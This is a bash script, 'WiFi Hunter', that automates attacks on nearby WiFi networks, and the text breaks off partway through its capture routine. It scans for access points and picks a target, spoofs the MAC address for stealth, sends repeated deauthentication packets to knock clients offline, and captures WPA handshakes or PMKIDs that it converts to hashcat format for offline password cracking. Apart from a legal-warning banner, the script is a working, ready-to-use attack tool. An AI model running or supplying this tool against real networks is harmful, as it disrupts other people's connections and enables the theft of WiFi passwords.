#!/bin/bash
# WiFi Hunter - Interactive Handshake Capture Tool
# For authorized testing of YOUR OWN networks only
#
# Features:
# - Scans and displays all nearby APs with channels
# - Interactive AP selection
# - Attack mode with automatic deauth
# - Real-time handshake monitoring
# - Automatic hashcat conversion

# Don't use set -e as it causes premature exit
# set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Global variables
MONITOR_INTERFACE=""
SCAN_FILE="/tmp/wifi_scan_$$"
CAPTURE_FILE=""
DEAUTH_PID=""
AIRODUMP_PID=""
ORIGINAL_MAC=""
CAPTURE_MODE=""
declare -g -A ap_clients

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"

    # Kill background processes
    if [ ! -z "$DEAUTH_PID" ]; then
        kill $DEAUTH_PID 2>/dev/null || true
    fi
    if [ ! -z "$AIRODUMP_PID" ]; then
        kill $AIRODUMP_PID 2>/dev/null || true
    fi

    # Remove temp files
    rm -f ${SCAN_FILE}* 2>/dev/null || true

    # Disable monitor mode
    if [ ! -z "$MONITOR_INTERFACE" ]; then
        echo -e "${BLUE}[*] Disabling monitor mode...${NC}"
        airmon-ng stop $MONITOR_INTERFACE 2>/dev/null || true
    fi

    # Restore original MAC address
    if [ ! -z "$ORIGINAL_MAC" ] && [ ! -z "$INTERFACE" ]; then
        echo -e "${BLUE}[*] Restoring original MAC address...${NC}"
        ip link set $INTERFACE down 2>/dev/null || true
        macchanger -p $INTERFACE 2>/dev/null || true
        ip link set $INTERFACE up 2>/dev/null || true
    fi

    # Restart network manager
    systemctl restart NetworkManager 2>/dev/null || true

    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

# Trap only Ctrl+C and kill signals (not normal exit)
trap cleanup INT TERM

# Show command being executed
show_command() {
    local cmd="$1"
    echo -e "${MAGENTA}[CMD]${NC} ${BOLD}$cmd${NC}"
    echo ""
}

# Banner
show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║                                                              ║"
    echo "║                      WiFi Hunter v1.0                        ║"
    echo "║              Handshake Capture & Deauth Tool                 ║"
    echo "║                                                              ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${RED}${BOLD}⚠️  LEGAL WARNING ⚠️${NC}"
    echo -e "${YELLOW}Only use on networks YOU OWN or have explicit authorization!${NC}"
    echo -e "${YELLOW}Unauthorized access is ILLEGAL.${NC}"
    echo ""
}

# Check if root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[-] Error: This script must be run as root${NC}"
        echo -e "${YELLOW}Usage: sudo $0${NC}"
        exit 1
    fi
}

# Check dependencies
check_dependencies() {
    local missing=""

    for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
        if ! command -v $cmd &> /dev/null; then
            missing="$missing $cmd"
        fi
    done

    if [ ! -z "$missing" ]; then
        echo -e "${RED}[-] Missing dependencies:$missing${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt install aircrack-ng${NC}"
        exit 1
    fi

    # Check optional tools
    echo -e "${BLUE}[*] Checking optional tools...${NC}"

    if command -v hcxdumptool &> /dev/null; then
        local hcx_version=$(hcxdumptool --version 2>&1 | head -1 || echo "unknown")
        echo -e "${GREEN}[+] hcxdumptool found: $hcx_version${NC}"
    else
        echo -e "${YELLOW}[!] hcxdumptool not found (needed for PMKID)${NC}"
        echo -e "${YELLOW}    Install: sudo apt install hcxdumptool${NC}"
    fi

    if command -v hcxpcapngtool &> /dev/null; then
        echo -e "${GREEN}[+] hcxpcapngtool found${NC}"
    else
        echo -e "${YELLOW}[!] hcxpcapngtool not found (needed for PMKID)${NC}"
        echo -e "${YELLOW}    Install: sudo apt install hcxtools${NC}"
    fi

    if command -v macchanger &> /dev/null; then
        echo -e "${GREEN}[+] macchanger found${NC}"
    else
        echo -e "${YELLOW}[!] macchanger not found (optional - for MAC spoofing)${NC}"
        echo -e "${YELLOW}    Install: sudo apt install macchanger${NC}"
    fi

    echo ""
    sleep 1
}

# Get wireless interface
get_interface() {
    echo -e "${BLUE}[*] Detecting wireless interfaces...${NC}"
    echo ""

    # List interfaces
    local interfaces=$(iwconfig 2>/dev/null | grep -o "^[a-z0-9]*" | grep -v "lo\|eth")

    if [ -z "$interfaces" ]; then
        echo -e "${RED}[-] No wireless interfaces found!${NC}"
        exit 1
    fi

    # Display interfaces
    echo -e "${GREEN}Available wireless interfaces:${NC}"
    local i=1
    local interface_array=()
    for iface in $interfaces; do
        interface_array+=("$iface")
        echo -e "  ${CYAN}[$i]${NC} $iface"
        ((i++))
    done

    echo ""
    read -p "Select interface [1]: " choice
    choice=${choice:-1}

    # Validate choice
    if [ "$choice" -lt 1 ] 2>/dev/null || [ "$choice" -gt ${#interface_array[@]} ] 2>/dev/null; then
        echo -e "${RED}[-] Invalid choice${NC}"
        exit 1
    fi

    INTERFACE="${interface_array[$((choice-1))]}"
    echo -e "${GREEN}[+] Selected: $INTERFACE${NC}"
}

# MAC address spoofing
spoof_mac() {
    echo ""
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                    MAC Address Spoofing                      ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Spoofing your MAC address improves anonymity and stealth.${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC} Randomize MAC address (recommended)"
    echo -e "  ${GREEN}[2]${NC} Keep original MAC address"
    echo ""

    read -p "Select option [1]: " mac_choice
    mac_choice=${mac_choice:-1}

    if [ "$mac_choice" = "1" ]; then
        # Check if macchanger is installed
        if ! command -v macchanger &> /dev/null; then
            echo -e "${YELLOW}[!] macchanger not installed${NC}"
            echo -e "${BLUE}[*] Install with: sudo apt install macchanger${NC}"
            echo -e "${YELLOW}[*] Continuing without MAC spoofing...${NC}"
            sleep 2
            return
        fi

        # Get original MAC
        ORIGINAL_MAC=$(ip link show $INTERFACE | grep -Po '(?<=link/ether )[0-9a-f:]+')

        echo -e "${BLUE}[*] Original MAC: $ORIGINAL_MAC${NC}"
        echo -e "${YELLOW}[*] Spoofing MAC address...${NC}"

        # Bring interface down
        ip link set $INTERFACE down

        # Randomize MAC
        show_command "macchanger -r $INTERFACE"
        macchanger -r $INTERFACE 2>/dev/null | grep -i "new mac"

        # Bring interface up
        ip link set $INTERFACE up

        local new_mac=$(ip link show $INTERFACE | grep -Po '(?<=link/ether )[0-9a-f:]+')
        echo -e "${GREEN}[+] MAC spoofed to: $new_mac${NC}"
        sleep 2
    else
        echo -e "${BLUE}[+] Keeping original MAC address${NC}"
    fi
}

# Enable monitor mode
enable_monitor_mode() {
    echo ""
    echo -e "${BLUE}[*] Enabling monitor mode on $INTERFACE...${NC}"

    # Kill interfering processes
    echo -e "${YELLOW}[*] Killing interfering processes...${NC}"
    show_command "airmon-ng check kill"
    airmon-ng check kill > /dev/null 2>&1

    # Enable monitor mode
    show_command "airmon-ng start $INTERFACE"
    airmon-ng start $INTERFACE > /dev/null 2>&1

    # Get monitor interface name
    MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')

    if [ -z "$MONITOR_INTERFACE" ]; then
        echo -e "${RED}[-] Failed to enable monitor mode${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Monitor mode enabled: $MONITOR_INTERFACE${NC}"
    sleep 2
}

# Scan for APs
scan_aps() {
    echo ""
    echo -e "${BLUE}[*] Scanning for access points...${NC}"
    echo -e "${YELLOW}[*] Scanning for 15 seconds, please wait...${NC}"

    # Start airodump-ng in background
    show_command "airodump-ng $MONITOR_INTERFACE -w $SCAN_FILE --output-format csv"
    airodump-ng $MONITOR_INTERFACE -w $SCAN_FILE --output-format csv > /dev/null 2>&1 &
    local scan_pid=$!

    # Progress bar
    for i in {1..15}; do
        echo -ne "\r${CYAN}[*] Progress: [$i/15] $(printf '#%.0s' $(seq 1 $i))${NC}"
        sleep 1
    done
    echo ""

    # Kill scan
    kill $scan_pid 2>/dev/null || true
    sleep 1

    # Check if scan file exists
    if [ ! -f "${SCAN_FILE}-01.csv" ]; then
        echo -e "${RED}[-] Scan failed - no data captured${NC}"
        exit 1
    fi
}

# Parse clients from CSV
parse_clients() {
    # Parse station (client) section of CSV
    local in_station_section=0

    while IFS=',' read -r station first_seen last_seen power packets bssid rest; do
        # Detect station section
        if [[ "$station" =~ "Station MAC" ]]; then
            in_station_section=1
            continue
        fi

        # Parse clients
        if [ $in_station_section -eq 1 ] && [[ "$station" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
            bssid=$(echo "$bssid" | xargs)

            # Store client for this BSSID
            if [ ! -z "$bssid" ] && [[ "$bssid" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
                if [ -z "${ap_clients[$bssid]}" ]; then
                    ap_clients[$bssid]=1
                else
                    ap_clients[$bssid]=$((${ap_clients[$bssid]} + 1))
                fi
            fi
        fi
    done < "${SCAN_FILE}-01.csv"
}

# Parse and display APs
display_aps() {
    echo ""
    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║                        Discovered Access Points                             ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Parse CSV and display
    local line_num=1
    declare -g -A ap_bssid
    declare -g -A ap_channel
    declare -g -A ap_essid
    declare -g -A ap_power
    declare -g -A ap_enc

    # Parse clients first
    parse_clients

    # Header
    printf "${CYAN}%-4s %-19s %-4s %-6s %-6s %-8s %-32s${NC}\n" "NUM" "BSSID" "CH" "PWR" "ENC" "CLIENTS" "ESSID"
    echo -e "${BLUE}$(printf '─%.0s' {1..88})${NC}"

    # Skip header lines and parse APs
    local index=1
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        # Skip if bssid is empty or header
        if [[ "$bssid" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
            # Clean up fields
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            power=$(echo "$power" | xargs)
            essid=$(echo "$essid" | xargs)
            privacy=$(echo "$privacy" | xargs)

            # Skip if no ESSID
            if [ -z "$essid" ]; then
                essid="<hidden>"
            fi

            # Store AP info
            ap_bssid[$index]="$bssid"
            ap_channel[$index]="$channel"
            ap_essid[$index]="$essid"
            ap_power[$index]="$power"
            ap_enc[$index]="$privacy"

            # Get client count
            local client_count="${ap_clients[$bssid]:-0}"

            # Color code by signal strength
            local color=$RED
            if [ ! -z "$power" ] && [ "$power" -gt -70 ]; then
                color=$GREEN
            elif [ ! -z "$power" ] && [ "$power" -gt -80 ]; then
                color=$YELLOW
            fi

            # Color code client count
            local client_color=$RED
            if [ $client_count -gt 0 ]; then
                client_color=$GREEN
            fi

            # Display AP
            printf "${color}%-4s${NC} %-19s %-4s %-6s %-6s ${client_color}%-8s${NC} %-32s\n" \
                "[$index]" "$bssid" "$channel" "$power" "$privacy" "$client_count" "${essid:0:32}"

            ((index++))
        fi
    done < <(tail -n +2 "${SCAN_FILE}-01.csv" | grep -E "^[0-9A-Fa-f:]{17}")

    # Store total count
    TOTAL_APS=$((index-1))

    echo ""
    echo -e "${GREEN}[+] Found $TOTAL_APS access points${NC}"

    if [ $TOTAL_APS -eq 0 ]; then
        echo -e "${RED}[-] No access points found. Try scanning again.${NC}"
        exit 1
    fi

    # Offer filtering
    echo ""
    echo -e "${YELLOW}Filter options:${NC}"
    echo -e "  ${CYAN}[c]${NC} Filter by clients (show only APs with connected devices)"
    echo -e "  ${CYAN}[s]${NC} Filter by signal (show only strong signals)"
    echo -e "  ${CYAN}[w]${NC} Filter by WPA2/WPA3 only"
    echo -e "  ${CYAN}[Enter]${NC} No filter (show all)"
    echo ""

    read -p "Apply filter? [Enter for none]: " filter_choice

    case "$filter_choice" in
        c|C)
            echo -e "${BLUE}[*] Showing only APs with connected clients...${NC}"
            # Already displayed above with client counts - just info message
            local filtered_count=0
            for ((i=1; i<=$TOTAL_APS; i++)); do
                local bssid="${ap_bssid[$i]}"
                local client_count="${ap_clients[$bssid]:-0}"
                if [ $client_count -gt 0 ]; then
                    ((filtered_count++))
                fi
            done
            echo -e "${GREEN}[+] $filtered_count APs have connected clients${NC}"
            ;;
        s|S)
            echo -e "${BLUE}[*] Strong signals: -70 dBm or better${NC}"
            local strong_count=0
            for ((i=1; i<=$TOTAL_APS; i++)); do
                local power="${ap_power[$i]}"
                if [ ! -z "$power" ] && [ "$power" -gt -70 ]; then
                    ((strong_count++))
                fi
            done
            echo -e "${GREEN}[+] $strong_count APs with strong signal${NC}"
            ;;
        w|W)
            echo -e "${BLUE}[*] WPA2/WPA3 networks only${NC}"
            local wpa_count=0
            for ((i=1; i<=$TOTAL_APS; i++)); do
                local enc="${ap_enc[$i]}"
                if [[ "$enc" =~ WPA2|WPA3 ]]; then
                    ((wpa_count++))
                fi
            done
            echo -e "${GREEN}[+] $wpa_count WPA2/WPA3 networks${NC}"
            ;;
        *)
            echo -e "${BLUE}[+] Showing all networks${NC}"
            ;;
    esac
}

# Select target AP
select_target() {
    echo ""
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                    Select Target Network                     ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    read -p "Enter target number [1]: " target_num
    target_num=${target_num:-1}

    # Validate selection
    if [ "$target_num" -lt 1 ] 2>/dev/null || [ "$target_num" -gt "$TOTAL_APS" ] 2>/dev/null; then
        echo -e "${RED}[-] Invalid selection${NC}"
        exit 1
    fi

    # Get target info
    TARGET_BSSID="${ap_bssid[$target_num]}"
    TARGET_CHANNEL="${ap_channel[$target_num]}"
    TARGET_ESSID="${ap_essid[$target_num]}"
    TARGET_POWER="${ap_power[$target_num]}"
    TARGET_ENC="${ap_enc[$target_num]}"

    # Display target info
    echo ""
    echo -e "${GREEN}╔═══════════════════ Target Selected ════════════════════╗${NC}"
    echo -e "${GREEN}║${NC} ESSID   : ${YELLOW}$TARGET_ESSID${NC}"
    echo -e "${GREEN}║${NC} BSSID   : ${YELLOW}$TARGET_BSSID${NC}"
    echo -e "${GREEN}║${NC} Channel : ${YELLOW}$TARGET_CHANNEL${NC}"
    echo -e "${GREEN}║${NC} Power   : ${YELLOW}$TARGET_POWER dBm${NC}"
    echo -e "${GREEN}║${NC} Encrypt : ${YELLOW}$TARGET_ENC${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
}

# Ask for capture mode
ask_capture_mode() {
    local client_count="${ap_clients[$TARGET_BSSID]:-0}"

    echo ""
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                      Capture Mode                            ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Choose capture method:${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC} PMKID capture (clientless - fast!)"
    echo -e "      ${BLUE}• Works without connected clients${NC}"
    echo -e "      ${BLUE}• Faster (90 seconds typical)${NC}"
    echo -e "      ${BLUE}• May not work if AP has 802.11w/PMF enabled${NC}"
    echo -e "      ${BLUE}• Requires hcxdumptool + hcxtools${NC}"
    echo ""
    echo -e "  ${GREEN}[2]${NC} WPA Handshake capture (traditional)"
    echo -e "      ${BLUE}• Requires clients connected (found: $client_count)${NC}"
    echo -e "      ${BLUE}• Works with ALL routers (most reliable)${NC}"
    echo -e "      ${BLUE}• Can use deauth attack${NC}"
    echo -e "      ${BLUE}• Uses standard aircrack-ng tools${NC}"
    echo ""

    # Default suggestion based on clients
    local default_mode=2
    if [ $client_count -eq 0 ]; then
        echo -e "${YELLOW}Suggestion: Try PMKID first (no clients detected)${NC}"
        default_mode=1
    else
        echo -e "${YELLOW}Suggestion: Handshake (most reliable with $client_count clients connected)${NC}"
        default_mode=2
    fi
    echo ""

    read -p "Select mode [$default_mode]: " capture_choice
    capture_choice=${capture_choice:-$default_mode}

    if [ "$capture_choice" = "1" ]; then
        CAPTURE_MODE="pmkid"
        echo -e "${GREEN}[+] PMKID capture mode enabled${NC}"
        echo -e "${YELLOW}[!] Note: PMKID may fail if:${NC}"
        echo -e "${YELLOW}    - Router has PMF (802.11w) enabled${NC}"
        echo -e "${YELLOW}    - Router is modern and has PMKID disabled${NC}"
        echo -e "${YELLOW}    - Signal is too weak${NC}"
        echo -e "${BLUE}[*] You can fallback to handshake if PMKID fails${NC}"
        sleep 2
    else
        CAPTURE_MODE="handshake"
        echo -e "${GREEN}[+] Handshake capture mode enabled${NC}"
        ask_attack_mode
    fi
}

# Ask for attack mode (for handshake only)
ask_attack_mode() {
    echo ""
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║                      Attack Mode                             ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Attack mode will automatically send deauth packets to force handshakes.${NC}"
    echo -e "${YELLOW}This disconnects clients briefly, causing them to reconnect.${NC}"
    echo ""
    echo -e "  ${GREEN}[1]${NC} Enable attack mode (deauth every 5 seconds)"
    echo -e "  ${GREEN}[2]${NC} Passive mode (wait for natural handshakes)"
    echo ""

    read -p "Select mode [1]: " attack_choice
    attack_choice=${attack_choice:-1}

    if [ "$attack_choice" = "1" ]; then
        ATTACK_MODE=true
        echo -e "${GREEN}[+] Attack mode enabled${NC}"
    else
        ATTACK_MODE=false
        echo -e "${BLUE}[+] Passive mode enabled${NC}"
    fi
}

# Start deauth attack in background
start_deauth_attack() {
    echo -e "${YELLOW}[*] Starting deauth attack...${NC}"
    show_command "aireplay-ng --deauth 5 -a $TARGET_BSSID $MONITOR_INTERFACE (looping every 5s)"

    # Deauth loop in background
    (
        while true; do
            aireplay-ng --deauth 5 -a $TARGET_BSSID $MONITOR_INTERFACE > /dev/null 2>&1
            sleep 5
        done
    ) &

    DEAUTH_PID=$!
    echo -e "${GREEN}[+] Deauth attack running (PID: $DEAUTH_PID)${NC}"
}

# Check for handshake
check_handshake() {
    local capfile=$1

    if [ ! -f "$capfile" ]; then
        return 1
    fi

    # Check if file has content
    if [ ! -s "$capfile" ]; then
        return 1
    fi

    # Check with aircrack-ng (suppress all errors and clean output)
    local output=$(aircrack-ng "$capfile" 2>/dev/null | grep "handshake" 2>/dev/null || echo "")

    # Look for "1 handshake" in output
    if echo "$output" | grep -q "1 handshake"; then
        return 0
    else
        return 1
    fi
}

# Monitor capture for handshake
monitor_handshake() {
    local capfile="${CAPTURE_FILE}-01.cap"
    local start_time=$(date +%s)

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              Monitoring for Handshake...                     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Press Ctrl+C to stop capture${NC}"
    echo ""

    local check_count=0
    local last_beacons=0
    local last_data=0
    local last_eapol=0

    while true; do
        sleep 5
        ((check_count++))

        # Check if airodump is still running
        if [ ! -z "$AIRODUMP_PID" ] && ! kill -0 $AIRODUMP_PID 2>/dev/null; then
            echo -e "\n${RED}[-] Error: Capture process died unexpectedly${NC}"
            return 1
        fi

        local elapsed=$(($(date +%s) - start_time))

        # Get capture statistics
        local beacons=0
        local data_packets=0
        local eapol=0

        if [ -f "$capfile" ]; then
            # Count packets using tcpdump
            if command -v tcpdump &> /dev/null; then
                # Ensure clean numeric values
                beacons=$(tcpdump -r "$capfile" -n 2>/dev/null | grep -c "Beacon" 2>/dev/null || echo "0")
                beacons=$(echo "$beacons" | grep -oE '^[0-9]+$' || echo "0")

                data_packets=$(tcpdump -r "$capfile" -n 2>/dev/null | grep -c "Data" 2>/dev/null || echo "0")
                data_packets=$(echo "$data_packets" | grep -oE '^[0-9]+$' || echo "0")

                eapol=$(tcpdump -r "$capfile" -n 2>/dev/null | grep -ci "EAPOL" 2>/dev/null || echo "0")
                eapol=$(echo "$eapol" | grep -oE '^[0-9]+$' || echo "0")
            fi
        fi

        # Display statistics
        echo -ne "\r${BLUE}Time: ${elapsed}s${NC} | ${CYAN}Beacons: $beacons${NC} | ${YELLOW}Data: $data_packets${NC} | ${GREEN}EAPOL: $eapol${NC} | ${MAGENTA}Checks: $check_count${NC}     "

        # Highlight EAPOL messages
        if [ "$eapol" -gt "$last_eapol" ] 2>/dev/null; then
            echo -e "\n${GREEN}[+] EAPOL message detected! ($eapol total)${NC}"
            last_eapol=$eapol
        fi

        # Check for handshake every 5 seconds
        if [ -f "$capfile" ]; then
            if check_handshake "$capfile"; then
                echo -e "\n"
                echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
                echo -e "${GREEN}${BOLD}║                  🎉 HANDSHAKE CAPTURED! 🎉                   ║${NC}"
                echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
                echo ""
                echo -e "${GREEN}[+] Final Stats: Beacons: $beacons | Data: $data_packets | EAPOL: $eapol${NC}"

                # Kill deauth if running
                if [ ! -z "$DEAUTH_PID" ]; then
                    kill $DEAUTH_PID 2>/dev/null || true
                    DEAUTH_PID=""
                fi

                # Kill airodump if running
                if [ ! -z "$AIRODUMP_PID" ]; then
                    kill $AIRODUMP_PID 2>/dev/null || true
                    AIRODUMP_PID=""
                fi

                sleep 2
                return 0
            fi
        fi

        last_beacons=$beacons
        last_data=$data_packets
    done
}

# PMKID capture with hcxdumptool
capture_pmkid() {
    # Check if hcxdumptool is installed
    if ! command -v hcxdumptool &> /dev/null; then
        echo -e "${RED}[-] hcxdumptool not found${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt install hcxdumptool${NC}"
        echo -e "${BLUE}[*] Falling back to handshake capture...${NC}"
        sleep 2
        CAPTURE_MODE="handshake"
        ask_attack_mode
        start_capture
        return
    fi

    # Check hcxpcapngtool availability upfront
    if ! command -v hcxpcapngtool &> /dev/null; then
        echo -e "${RED}[-] hcxpcapngtool not found (required for PMKID)${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt install hcxtools${NC}"
        echo -e "${BLUE}[*] Falling back to handshake capture...${NC}"
        sleep 2
        CAPTURE_MODE="handshake"
        ask_attack_mode
        start_capture
        return
    fi

    # Generate capture filename
    local timestamp=$(date +%Y%m%d_%H%M%S)
    CAPTURE_FILE="pmkid_${TARGET_ESSID// /_}_${timestamp}"
    local pcapng_file="${CAPTURE_FILE}.pcapng"
    local filter_file="/tmp/hcxdumptool_filter_$$.txt"

    # Create filter file with target BSSID
    echo "$TARGET_BSSID" > "$filter_file"

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                  Starting PMKID Capture                      ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}[*] Target   : ${YELLOW}$TARGET_ESSID ($TARGET_BSSID)${NC}"
    echo -e "${BLUE}[*] Channel  : ${YELLOW}$TARGET_CHANNEL${NC}"
    echo -e "${BLUE}[*] Output   : ${YELLOW}${pcapng_file}${NC}"
    echo -e "${BLUE}[*] Mode     : ${YELLOW}PMKID (clientless)${NC}"
    echo ""
    echo -e "${YELLOW}[*] Attempting PMKID capture for 90 seconds...${NC}"
    echo -e "${YELLOW}[*] This sends association requests to capture PMKID${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop early${NC}"
    echo ""

    # Set channel first
    echo -e "${BLUE}[*] Setting channel to $TARGET_CHANNEL...${NC}"
    iwconfig $MONITOR_INTERFACE channel $TARGET_CHANNEL 2>/dev/null

    # Run hcxdumptool with correct parameters
    # Modern hcxdumptool syntax (v6.x):
    # -i interface, -o output, --filterlist_ap=file, --filtermode=2 (use filter), --enable_status=15 (show all)
    show_command "hcxdumptool -i $MONITOR_INTERFACE -o $pcapng_file --filterlist_ap=$filter_file --filtermode=2 --enable_status=15"

    # Run with timeout and capture output
    timeout 90 hcxdumptool -i $MONITOR_INTERFACE -o $pcapng_file --filterlist_ap=$filter_file --filtermode=2 --enable_status=15 2>&1 | while IFS= read -r line; do
        # Show important status messages
        if [[ "$line" =~ PMKID|FOUND|sent|received|error|failed ]]; then
            echo -e "${CYAN}[STATUS]${NC} $line"
        fi
    done

    local hcx_exit=$?
    echo ""

    # Clean up filter file
    rm -f "$filter_file"

    # Check if capture completed
    if [ $hcx_exit -eq 124 ]; then
        echo -e "${BLUE}[*] Capture timeout reached (normal)${NC}"
    elif [ $hcx_exit -ne 0 ] && [ $hcx_exit -ne 124 ]; then
        echo -e "${YELLOW}[!] hcxdumptool exited with code $hcx_exit${NC}"
    fi

    # Check if file was created and has content
    if [ ! -f "$pcapng_file" ]; then
        echo -e "${RED}[-] PMKID capture failed - no output file created${NC}"
        echo -e "${YELLOW}[*] Possible issues:${NC}"
        echo -e "${YELLOW}    - Interface not in monitor mode${NC}"
        echo -e "${YELLOW}    - Permission issues${NC}"
        echo -e "${YELLOW}    - hcxdumptool version incompatibility${NC}"
        echo -e "${BLUE}[*] Try handshake capture instead${NC}"
        return 1
    fi

    if [ ! -s "$pcapng_file" ]; then
        echo -e "${RED}[-] PMKID capture failed - output file is empty${NC}"
        echo -e "${YELLOW}[*] AP may be out of range or not responding${NC}"
        echo -e "${BLUE}[*] Try handshake capture instead${NC}"
        rm -f "$pcapng_file"
        return 1
    fi

    # Show file size
    local file_size=$(du -h "$pcapng_file" | cut -f1)
    echo -e "${GREEN}[+] Capture file created: $file_size${NC}"

    # Convert to hashcat format
    local hc_file="${CAPTURE_FILE}.hc22000"
    echo -e "${BLUE}[*] Converting to hashcat format...${NC}"
    show_command "hcxpcapngtool -o $hc_file $pcapng_file"

    # Capture full output for diagnostics
    local convert_output=$(hcxpcapngtool -o $hc_file $pcapng_file 2>&1)
    echo "$convert_output" | grep -E "PMKID|written|summary"

    if [ -f "$hc_file" ] && [ -s "$hc_file" ]; then
        # Check if PMKID was actually found
        local pmkid_count=$(echo "$convert_output" | grep -i "PMKID" | grep -oE '[0-9]+' | head -1)

        if [ -z "$pmkid_count" ] || [ "$pmkid_count" = "0" ]; then
            echo ""
            echo -e "${RED}[-] No PMKID found in capture${NC}"
            echo -e "${YELLOW}[*] This AP likely doesn't support PMKID or:${NC}"
            echo -e "${YELLOW}    - AP has PMKID disabled (802.11w/PMF enabled)${NC}"
            echo -e "${YELLOW}    - AP is too far away${NC}"
            echo -e "${YELLOW}    - Need to wait longer${NC}"
            echo -e "${BLUE}[*] Try handshake capture instead${NC}"
            return 1
        fi

        echo ""
        echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}║                  🎉 PMKID CAPTURED! 🎉                       ║${NC}"
        echo -e "${GREEN}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}[+] PMKID successfully captured ($pmkid_count found)${NC}"
        echo -e "${GREEN}[+] File: $hc_file${NC}"

        # Build hashcat command
        build_hashcat_command "$hc_file"
        return 0
    else
        echo -e "${RED}[-] Conversion failed or no PMKID found${NC}"
        echo -e "${YELLOW}[*] Full output:${NC}"
        echo "$convert_output"
        echo ""
        echo -e "${BLUE}[*] Try handshake capture instead${NC}"
        return 1
    fi
}

# Start capture
start_capture() {
    # Generate capture filename
    local timestamp=$(date +%Y%m%d_%H%M%S)
    CAPTURE_FILE="handshake_${TARGET_ESSID// /_}_${timestamp}"

    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                  Starting Capture                            ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}[*] Target   : ${YELLOW}$TARGET_ESSID ($TARGET_BSSID)${NC}"
    echo -e "${BLUE}[*] Channel  : ${YELLOW}$TARGET_CHANNEL${NC}"
    echo -e "${BLUE}[*] Output   : ${YELLOW}${CAPTURE_FILE}-01.cap${NC}"
    echo -e "${BLUE}[*] Mode     : ${YELLOW}$([ "$ATTACK_MODE" = true ] && echo "Attack (Deauth)" || echo "Passive")${NC}"
    echo ""

    # Start airodump-ng in background
    show_command "airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $CAPTURE_FILE $MONITOR_INTERFACE"
    airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID -w $CAPTURE_FILE $MONITOR_INTERFACE > /dev/null 2>&1 &
    AIRODUMP_PID=$!

    echo -e "${GREEN}[+] Capture started (PID: $AIRODUMP_PID)${NC}"

    sleep 3

    # Verify airodump-ng is still running
    if ! kill -0 $AIRODUMP_PID 2>/dev/null; then
        echo -e "${RED}[-] Error: Capture process died immediately${NC}"
        echo -e "${YELLOW}[*] Check your wireless interface and try again${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Capture process confirmed running${NC}"

    # Start deauth if attack mode enabled
    if [ "$ATTACK_MODE" = true ]; then
        start_deauth_attack
    fi

    # Monitor for handshake with retry logic
    local max_attempts=3
    local attempt=1

    while [ $attempt -le $max_attempts ]; do
        echo -e "${CYAN}[*] Capture attempt $attempt of $max_attempts${NC}"

        monitor_handshake
